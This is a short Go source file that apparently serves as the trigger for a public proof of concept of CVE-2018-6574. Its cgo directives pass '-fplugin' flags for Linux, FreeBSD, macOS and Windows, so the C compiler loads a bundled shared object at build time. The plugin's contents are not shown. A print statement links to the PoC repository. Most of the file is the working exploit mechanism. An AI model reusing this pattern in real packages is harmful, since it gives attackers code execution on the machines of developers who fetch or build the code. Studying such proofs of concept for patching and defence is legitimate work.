package main

/*
#cgo linux CFLAGS: -fplugin=./calc.so
#cgo freebsd CFLAGS: -fplugin=./calc.so
#cgo darwin CFLAGS: -fplugin=./calc_darwin.so
#cgo windows CFLAGS: -fplugin=./calc_win.so

void echo() {
  printf("link: https://github.com/neargle/CVE-2018-6574-POC");
}

*/
import "C"

func main() {
	C.echo()
	return
}
